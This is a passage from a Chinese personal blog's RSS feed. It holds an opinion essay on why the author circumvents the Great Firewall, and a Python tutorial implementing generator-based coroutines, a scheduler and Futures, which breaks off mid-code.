      <content:encoded><![CDATA[<p >很多人不解为什么我要翻墙。他们认为，国家明令禁止的东西就不应该去做——而更何况，墙内的世界已经足够精彩，异世界的天空也不一定令人神往。</p><p >在中国大陆，能上网的人被分为两类：翻墙的 与 不翻墙的。这里说的“翻墙”不是“有能力翻墙”，而是“有意愿翻墙”。这两类人奇怪地构成了一个鄙视环。翻墙的 看不起 不翻墙的，认为后者甘于“虚假”的现状。其中不乏有狂热的传教者，不遗余力地宣传墙外的世界，并对不接受者嗤之以鼻；同时，不翻墙的 又鄙视 翻墙的，认为后者崇洋媚外，被国外反华势力蛊惑，以致对 翻墙 产生如信仰宗教般的虔诚。</p><p >对于不理解我的人，我表示理解。如果我也以你们的身份生活在你们的环境，墙内的世界的确很大、很精彩，的确足够了。再者，翻墙 很麻烦、很不稳定，牺牲流畅性与易用性去浏览一些无趣的内容，确实不值得。</p><p >但我想说的是：墙内的世界对于某些人而言，贫乏得可伶。</p><p >我喜欢编程。与写作不同的是，编程不仅要靠思考，更需要一些外部工具的辅助。思维是编程工作的灵魂，但思维仅仅提供了一个脉络，在思维的引领下，我需要组合使用各种工具来解决问题。工具的数量很多，细节很复杂，我不可能记住，也不应该都记住。因此，我需要搜索它们的使用说明。一个好的搜索引擎是编程时必备的利器，而我选择了 Google。不是因为我崇洋媚外，而是 它 <strong>的确</strong> 能高效地让我找到答案，解决我的问题。</p><p >我要翻墙，因为我想要的工具在墙内不存在。同时，有一些我想要的答案也在墙外（如 Wikipedia）或部分在墙外（如 引用了 Google CDN 的 StackOverflow）或时不时在墙外（如 Github）。当你的合理需求无法满足时，理智的人都会想方设法地去满足——这很自然，就像吃完了一片草地的羊群会自动迁徙至另一片草地一样。</p><p >是的，我翻墙，只是因为我有翻墙的需求。对于某些翻墙发烧友所推荐的某些“真相”，我不感兴趣。隐匿的东西之所以被隐匿，总有它的理由；而被揭露的东西之所以被揭露，也总有他们的目的。</p><p >百度作的恶，不能原谅。但抛开这一点，我并不排斥百度。百度不如 Google 科学，但它更适合中国。西方人更注重逻辑思维，同时他们也有更高的受教育程度，科学的 Google 是他们所需要的。而在中国，真正需要科学的只有很少一部分人，更多的人需要的只是科普，一个浅显的答案，只要结论正确，甚至不需要完全严密的推理，足够了。更何况，中国的网络是一个娱乐至上的环境，一个八卦的搜索引擎也许会比一个严谨刻板的搜索引擎更受国人青睐。</p><p >对于 GFW，即 墙 本身，我也不怨恨。起初接触到这样一个存在时，我很惊讶，感叹国家还有这样的一面。这个无形的庞然大物产生于旧世纪末，有其特定的时代背景，被人诟病的同时却也有着它的合理性。有人认为，思想自由是人权的一部分，GFW 的存在是反人类的。有段时间我信以为然，并传播这样的思想。但当我真实地接触到那些“被禁锢的人”时，我却犹豫了。前段时间的“诺贝尔哥”事件就是一个很好的样例。<strong>游荡在网络中的许多中国人是不理智的</strong>——尽管他们也受过教育，但接受的只是知识，而不是思维。他们甚至不知逻辑为何物。这些人看起来是无害的，可一旦他们接触到所谓的“真相”，或说是一些人想让我们接触到的“真相”时，感性会使他们意气用事，造成社会的不稳定。诚然，人权至上，但社会稳定更重要，人权在乱世只是一纸空话。历史的对错，国家自己知道。民众应该知道历史，但如果真相会对现实产生不可预测的坏影响，倒不如让它烂在土里。</p><p >我不嘲笑 不翻墙 的人，他们扮演着自己的角色，有着自己的需求与选择；我也会继续 翻墙，因为我有这样的需要。</p><p >驱使一切的，只是需求而已。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Random-Thoughts/">Random Thoughts</category>
      
      
      <comments>https://i.hsfzxjy.site/why-I-choose-to-climb-over-the-wall/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Python“黑魔法”之 Generator Coroutines</title>
      <link>https://i.hsfzxjy.site/python-generator-coroutine/</link>
      <guid>https://i.hsfzxjy.site/python-generator-coroutine/</guid>
      <pubDate>Fri, 01 Apr 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;写在前面&quot;&gt;写在前面&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;本文默认读者对 Python 生成器 有一定的了解，不了解者请移步至&lt;a href=&quot;http://www.liaoxuefeng.com/wiki/0014316089557264a6b</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="写在前面">写在前面</h2><blockquote><ul><li>本文默认读者对 Python 生成器 有一定的了解，不了解者请移步至<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014317799226173f45ce40636141b6abc8424e12b5fb27000">生成器 - 廖雪峰的官方网站</a>。</li><li>本文基于 Python 3.5.1，文中所有的例子都可在 <a href="https://github.com/hsfzxjy/python-generator-coroutine-examples">Github</a> 上获得。</li></ul></blockquote><p >学过 Python 的都知道，Python 里有一个很厉害的概念叫做 生成器（Generators）。一个生成器就像是一个微小的线程，可以随处暂停，也可以随时恢复执行，还可以和代码块外部进行数据交换。恰当使用生成器，可以极大地简化代码逻辑。</p><p >也许，你可以熟练地使用生成器完成一些看似不可能的任务，如“无穷斐波那契数列”，并引以为豪，认为所谓的生成器也不过如此——那我可要告诉你：这些都太小儿科了，下面我所要介绍的绝对会让你大开眼界。</p><p ><strong>生成器 可以实现 协程，你相信吗？</strong></p><h2 id="什么是协程">什么是协程</h2><p >在异步编程盛行的今天，也许你已经对 协程（coroutines）早有耳闻，但却不一定了解它。我们先来看看 <a href="https://en.wikipedia.org/wiki/Coroutine">Wikipedia</a> 的定义：</p><blockquote><p >Coroutines are computer program components that generalize subroutines for nonpreemptive multitasking, by allowing multiple entry points for suspending and resuming execution at certain locations.</p></blockquote><p >也就是说：协程是一种 <strong>允许在特定位置暂停或恢复的子程序</strong>——这一点和 生成器 相似。但和 生成器 不同的是，协程 可以控制子程序暂停之后代码的走向，而 生成器 仅能被动地将控制权交还给调用者。</p><p >协程 是一种很实用的技术。和 多进程 与 多线程 相比，协程 可以只利用一个线程更加轻便地实现 多任务，将任务切换的开销降至最低。和 回调 等其他异步技术相比，协程 维持了正常的代码流程，在保证代码可读性的同时最大化地利用了 阻塞 IO 的空闲时间。它的高效与简洁赢得了开发者们的拥戴。</p><h2 id="python-中的协程">Python 中的协程</h2><p >早先 Python 是没有原生协程支持的，因此在 协程 这个领域出现了百家争鸣的现象。主流的实现由以下两种：</p><ul><li>用 C 实现协程调度。这一派以 gevent 为代表，在底层实现了协程调度，并将大部分的 阻塞 IO 重写为异步。</li><li>用 生成器模拟。这一派以 Tornado 为代表。Tornado 是一个老牌的异步 Web 框架，涵盖了五花八门的异步编程方式，其中包括 协程。本文部分代码借鉴于 Tornado。</li></ul><p >直至 Python 3.4，Python 第一次将异步编程纳入标准库中（参见 <a href="https://www.python.org/dev/peps/pep-3156/">PEP 3156</a>），其中包括了用生成器模拟的 协程。而在 Python 3.5 中，Guido 总算在语法层面上实现了 协程（参见 <a href="https://www.python.org/dev/peps/pep-0492/">PEP 0492</a>）。比起 <code>yield</code> 关键字，新关键字 <code>async</code> 和 <code>await</code> 具有更好的可读性。在不久的将来，新的实现将会慢慢统一混乱已久的协程领域。</p><p >尽管 生成器协程 已成为了过去时，但它曾经的辉煌却不可磨灭。下面，让我们一起来探索其中的魔法。</p><h2 id="一个简单的例子">一个简单的例子</h2><p >假设有两个子程序 <code>main</code> 和 <code>printer</code>。<code>printer</code> 是一个死循环，等待输入、加工并输出结果。<code>main</code> 作为主程序，不时地向 <code>printer</code> 发送数据。</p><p >这应该怎么实现呢？</p><p >传统方式中，这几乎不可能在一个线程中实现，因为死循环会阻塞。而协程却能很好地解决这个问题：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printer</span>():</span><br><span class="line"></span><br><span class="line">    counter = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">        string = (<span class="hljs-keyword">yield</span>)</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[{0}] {1}&#x27;</span>.<span class="hljs-built_in">format</span>(counter, string))</span><br><span class="line">        counter += <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = printer()</span><br><span class="line">    <span class="hljs-built_in">next</span>(p)</span><br><span class="line">    p.send(<span class="hljs-string">&#x27;Hi&#x27;</span>)</span><br><span class="line">    p.send(<span class="hljs-string">&#x27;My name is hsfzxjy.&#x27;</span>)</span><br><span class="line">    p.send(<span class="hljs-string">&#x27;Bye!&#x27;</span>)</span><br><span class="line"></span><br></pre></div></div><p >输出：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">[0] Hi</span><br><span class="line">[1] My name is hsfzxjy.</span><br><span class="line">[2] Bye!</span><br></pre></div></div><p >这其实就是最简单的协程。程序由两个分支组成。主程序通过 <code>send</code> 唤起子程序并传入数据，子程序处理完后，用 <code>yield</code> 将自己挂起，并返回主程序，如此交替进行。</p><h2 id="协程调度">协程调度</h2><p >有时，你的手头上会有多个任务，每个任务耗时很长，而你又不想同步处理，而是希望能像多线程一样交替执行。这时，你就需要一个调度器来协调流程了。</p><p >作为例子，我们假设有这么一个任务：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">name, times</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(times):</span><br><span class="line">        <span class="hljs-built_in">print</span>(name, i)</span><br></pre></div></div><p >如果你直接执行 <code>task</code>，那它会在遍历 <code>times</code> 次之后才会返回。为了实现我们的目的，我们需要将 <code>task</code> 人为地切割成若干块，以便并行处理：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">name, times</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(times):</span><br><span class="line">        <span class="hljs-keyword">yield</span></span><br><span class="line">        <span class="hljs-built_in">print</span>(name, i)</span><br></pre></div></div><p >这里的 <code>yield</code> 没有逻辑意义，仅是作为暂停的标志点。程序流可以在此暂停，也可以在此恢复。而通过实现一个调度器，我们可以完成多个任务的并行处理：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Runner</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, tasks</span>):</span><br><span class="line">        self.tasks = deque(tasks)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-keyword">return</span> self.tasks.pop()</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(self.tasks):</span><br><span class="line">            task = self.<span class="hljs-built_in">next</span>()</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-built_in">next</span>(task)</span><br><span class="line">            <span class="hljs-keyword">except</span> StopIteration:</span><br><span class="line">                <span class="hljs-keyword">pass</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                self.tasks.appendleft(task)</span><br></pre></div></div><p >这里我们用一个队列（deque）储存任务列表。其中的 <code>run</code> 是一个重要的方法： <strong>它通过轮转队列依次唤起任务，并将已经完成的任务清出队列</strong>，简洁地模拟了任务调度的过程。</p><p >而现在，我们只需调用：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">Runner([</span><br><span class="line">    task(<span class="hljs-string">&#x27;hsfzxjy&#x27;</span>, <span class="hljs-number">5</span>),</span><br><span class="line">    task(<span class="hljs-string">&#x27;Jack&#x27;</span>, <span class="hljs-number">4</span>),</span><br><span class="line">    task(<span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-number">6</span>)</span><br><span class="line">]).run()</span><br></pre></div></div><p >就可以得到预想中的效果了：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line">Bob 0</span><br><span class="line">Jack 0</span><br><span class="line">hsfzxjy 0</span><br><span class="line">Bob 1</span><br><span class="line">Jack 1</span><br><span class="line">hsfzxjy 1</span><br><span class="line">Bob 2</span><br><span class="line">Jack 2</span><br><span class="line">hsfzxjy 2</span><br><span class="line">Bob 3</span><br><span class="line">Jack 3</span><br><span class="line">hsfzxjy 3</span><br><span class="line">Bob 4</span><br><span class="line">hsfzxjy 4</span><br><span class="line">Bob 5</span><br></pre></div></div><p >简直完美！答案和丑陋的多线程别无二样，代码却简单了不止一个数量级。</p><h2 id="异步-io-模拟">异步 IO 模拟</h2><p >你绝对有过这样的烦恼：程序常常被时滞严重的 IO 操作（数据库查询、大文件读取、越过长城拿数据）阻塞，在等待 IO 返回期间，线程就像死了一样，空耗着时间。为此，你不得不用多线程甚至是多进程来解决问题。</p><p >而事实上，在等待 IO 的时候，你完全可以做一些与数据无关的操作，最大化地利用时间。Node.js 在这点做得不错——它将一切异步化，压榨性能。只可惜它的异步是基于事件回调机制的，稍有不慎，你就有可能陷入 Callback Hell 的深渊。</p><p >而协程并不使用回调，相比之下可读性会好很多。其思路大致如下：</p><ul><li>维护一个消息队列，用于储存 IO 记录。</li><li>协程函数 IO 时，自身挂起，同时向消息队列插入一个记录。</li><li>通过轮询或是 epoll 等事件框架，捕获 IO 返回的事件。</li><li>从消息队列中取出记录，恢复协程函数。</li></ul><p >现在假设有这么一个耗时任务：</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">name</span>):</span><br><span class="line">    <span class="hljs-built_in">print</span>(name, <span class="hljs-number">1</span>)</span><br><span class="line">    sleep(<span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-built_in">print</span>(name, <span class="hljs-number">2</span>)</span><br><span class="line">    sleep(<span class="hljs-number">2</span>)</span><br><span class="line">    <span class="hljs-built_in">print</span>(name, <span class="hljs-number">3</span>)</span><br></pre></div></div><p >正常情况下，这个任务执行完需要 3 秒，倘若多个同步任务同步执行，执行时间会成倍增长。而如果利用协程，我们就可以在接近 3 秒的时间内完成多个任务。</p><p >首先我们要实现消息队列：</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line">events_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Event</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span><br><span class="line">        self.callback = <span class="hljs-keyword">lambda</span>: <span class="hljs-literal">None</span></span><br><span class="line">        events_list.append(self)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_callback</span>(<span class="hljs-params">self, callback</span>):</span><br><span class="line">        self.callback = callback</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_ready</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        result = self._is_ready()</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> result:</span><br><span class="line">            self.callback()</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> result</span><br></pre></div></div><p ><code>Event</code> 是消息的基类，其在初始化时会将自己放入消息队列 <code>events_list</code> 中。<code>Event</code> 和 调度器 使用回调进行交互。</p><p >接着我们要 hack 掉 <code>sleep</code> 函数，这是因为原生的 <code>time.sleep()</code> 会阻塞线程。通过自定义 <code>sleep</code> 我们可以模拟异步延时操作：</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># sleep.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> event <span class="hljs-keyword">import</span> Event</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SleepEvent</span>(<span class="hljs-title class_ inherited__">Event</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, timeout</span>):</span><br><span class="line">        <span class="hljs-built_in">super</span>(SleepEvent, self).__init__(timeout)</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        self.start_time = time()</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_is_ready</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-keyword">return</span> time() - self.start_time &gt;= self.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">timeout</span>):</span><br><span class="line">    <span class="hljs-keyword">return</span> SleepEvent(timeout)</span><br></pre></div></div><p >可以看出：<code>sleep</code> 在调用后就会立即返回，同时一个 <code>SleepEvent</code> 对象会被放入消息队列，经过<code>timeout</code> 秒后执行回调。</p><p >再接下来便是协程调度了：</p><div class="gk-code hljs" data-gk-id="BLOCK11"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># runner.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> event <span class="hljs-keyword">import</span> events_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">tasks</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:</span><br><span class="line">        _<span class="hljs-built_in">next</span>(task)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(events_list):</span><br><span class="line">        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> events_list:</span><br><span class="line">            <span class="hljs-keyword">if</span> event.is_ready():</span><br><span class="line">                events_list.remove(event)</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_next</span>(<span class="hljs-params">task</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        event = <span class="hljs-built_in">next</span>(task)</span><br><span class="line">        event.set_callback(<span class="hljs-keyword">lambda</span>: _<span class="hljs-built_in">next</span>(task)) <span class="hljs-comment"># 1</span></span><br><span class="line">    <span class="hljs-keyword">except</span> StopIteration:</span><br><span class="line">        <span class="hljs-keyword">pass</span></span><br></pre></div></div><p ><code>run</code> 启动了所有的子程序，并开始消息循环。每遇到一处挂起，调度器自动设置回调，并在回调中重新恢复代码流。“1”处巧妙地利用闭包保存状态。</p><p >最后是主代码：</p><div class="gk-code hljs" data-gk-id="BLOCK12"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">from</span> sleep <span class="hljs-keyword">import</span> sleep</span><br><span class="line"><span class="hljs-keyword">import</span> runner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">name</span>):</span><br><span class="line">    <span class="hljs-built_in">print</span>(name, <span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-keyword">yield</span> sleep(<span class="hljs-number">1</span>)</span><br><span class="line">    <span class="hljs-built_in">print</span>(name, <span class="hljs-number">2</span>)</span><br><span class="line">    <span class="hljs-keyword">yield</span> sleep(<span class="hljs-number">2</span>)</span><br><span class="line">    <span class="hljs-built_in">print</span>(name, <span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    runner.run((task(<span class="hljs-string">&#x27;hsfzxjy&#x27;</span>), task(<span class="hljs-string">&#x27;Jack&#x27;</span>)))</span><br></pre></div></div><p >输出：</p><div class="gk-code hljs" data-gk-id="BLOCK13"><div class="gk-code-display"><pre><span class="line">hsfzxjy 1</span><br><span class="line">Jack 1</span><br><span class="line">hsfzxjy 2</span><br><span class="line">Jack 2</span><br><span class="line">hsfzxjy 3</span><br><span class="line">Jack 3</span><br><span class="line"># [Finished in 3.0s]</span><br></pre></div></div><h2 id="协程函数的层级调用">协程函数的层级调用</h2><p >上面的代码有一个不足之处，即协程函数返回的是一个 <code>Event</code> 对象。然而事实上只有直接操纵 IO 的协程函数才有可能接触到这个对象。那么，对于调用了 IO 的函数的调用者，它们应该如何实现呢？</p><p >设想如下任务：</p><div class="gk-code hljs" data-gk-id="BLOCK14"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">long_add</span>(<span class="hljs-params">x, y, duration=<span class="hljs-number">1</span></span>):</span><br><span class="line">    <span class="hljs-keyword">yield</span> sleep(duration)</span><br><span class="line">    <span class="hljs-keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">duration</span>):</span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start:&#x27;</span>, time())</span><br><span class="line">    <span class="hljs-built_in">print</span>((<span class="hljs-keyword">yield</span> long_add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, duration)))</span><br><span class="line">    <span class="hljs-built_in">print</span>((<span class="hljs-keyword">yield</span> long_add(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, duration)))</span><br></pre></div></div><p ><code>long_add</code> 是 IO 的一级调用者，<code>task</code> 调用 <code>long_add</code>，并利用其返回值进行后续操作。</p><p >简而言之，我们遇到的问题是：<strong>一个被唤起的协程函数如何唤起它的调用者？</strong></p><p >正如在上个例子中，协程函数通过 <code>Event</code> 的回调与调度器交互。同理，我们也可以使用一个类似的对象，在这里我们称其为 <code>Future</code>。</p><p ><code>Future</code> 保存在被调用者的闭包中，并由被调用者返回。而调用者通过在其上面设置回调函数，实现两个协程函数之间的交互。</p><p ><code>Future</code> 的代码如下，看起来有点像 <code>Event</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK15"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># future.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Future</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-built_in">super</span>(Future, self).__init__()</span><br><span class="line">        self.callback = <span class="hljs-keyword">lambda</span> *args: <span class="hljs-literal">None</span></span><br><span class="line">        self._done = <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_callback</span>(<span class="hljs-params">self, callback</span>):</span><br><span class="line">        self.callback = callback</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">done</span>(<span class="hljs-params">self, value=<span class="hljs-literal">None</span></span>):</span><br><span class="line">        self._done = <span class="hljs-literal">True</span></span><br><span class="line">        self.callback(value)</span><br></pre></div></div><p ><code>Future</code> 的回调函数允许接受一个参数作为返回值，以尽可能地模拟一般函数。</p><p >但这样一来，协程函数就会有些复杂了。它们不仅要负责唤醒被调用者，还要负责与调用者之间的交互。这会产生许多重复代码。为了 D.R.Y，我们用装饰器封装这一逻辑：</p><div class="gk-code hljs" data-gk-id="BLOCK16"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># co.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> wraps</span><br><span class="line"><span class="hljs-keyword">from</span> future <span class="hljs-keyword">import</span> Future</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_next</span>(<span class="hljs-params">gen, future, value=<span class="hljs-literal">None</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            yielded_future = gen.send(value)</span><br><span class="line">        <span class="hljs-keyword">except</span> TypeError:</span><br><span class="line">            yielded_future = <span class="hljs-built_in">next</span>(gen)</span><br><span class="line"></span><br><span class="line">        yielded_future.set_callback(<span class="hljs-keyword">lambda</span> value: _<span class="hljs-built_in">next</span>(gen, future, value))</span><br><span class="line">    <span class="hljs-keyword">except</span> StopIteration <span class="hljs-keyword">as</span> e:</span><br><span class="line">        future.done(e.value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">coroutine</span>(<span class="hljs-params">func</span>):</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">    @wraps(<span class="hljs-params">func</span>)</span></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br><span class="line">        future = Future()</span><br><span class="line"></span><br><span class="line">        gen = func(*args, **kwargs)</span><br><span class="line">        _<span class="hljs-built_in">next</span>(gen, future)</span><br><span class="line">        <span class="hljs-keyword">return</span> future</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><br></pre></div></div><p >被 <code>coroutine</code> 包装过的生成器成为了一个普通函数，返回一个 <code>Future</code> 对象。<code>_next</code> 为唤醒的核心逻辑，通过一个类似递归的回调设置简洁地实现自我唤醒。当自己执行完时，会将自己闭包内的<code>Future</code>对象标记为<code>done</code>，从而唤醒调用者。</p><p >为了适应新变化，<code>sleep</code> 也要做相应的更改：</p><div class="gk-code hljs" data-gk-id="BLOCK17"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">from</span> event <span class="hljs-keyword">import</span> Event</span><br><span class="line"><span class="hljs-keyword">from</span> future <span class="hljs-keyword">import</span> Future</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SleepEvent</span>(<span class="hljs-title class_ inherited__">Event</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, timeout</span>):</span><br><span class="line">        <span class="hljs-built_in">super</span>(SleepEvent, self).__init__()</span><br><span class="line">        self.start_time = time()</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_is_ready</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-keyword">return</span> time() - self.start_time &gt;= self.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">timeout</span>):</span><br><span class="line">    future = Future()</span><br><span class="line">    event = SleepEvent(timeout)</span><br><span class="line">    event.set_callback(<span class="hljs-keyword">lambda</span>: future.done())</span><br><span class="line">    <span class="hljs-keyword">return</span> future</span><br></pre></div></div><p ><code>sleep</code> 不再返回 <code>Event</code> 对象，而是一致地返回 <code>Future</code>，并作为 <code>Event</code> 和 <code>Future</code> 之间的代理者。</p><p >基于以上更改，调度器可以更加简洁——这是因为协程函数能够自我唤醒：</p><div class="gk-code hljs" data-gk-id="BLOCK18"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># runner.py</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> event <span class="hljs-keyword">import</span> events_list</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(events_list):</span><br><span class="line">        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> events_list:</span><br><span class="line">            <span class="hljs-keyword">if</span> event.is_ready():</span><br><span class="line">                events_list.remove(event)</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br></pre></div></div><p >主程序：</p><div class="gk-code hljs" data-gk-id="BLOCK19"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">from</span> co <span class="hljs-keyword">import</span> coroutine</span><br><span class="line"><span class="hljs-keyword">from</span> sleep <span class="hljs-keyword">import</span> sleep</span><br><span class="line"><span class="hljs-keyword">import</span> runner</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@coroutine</span></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title 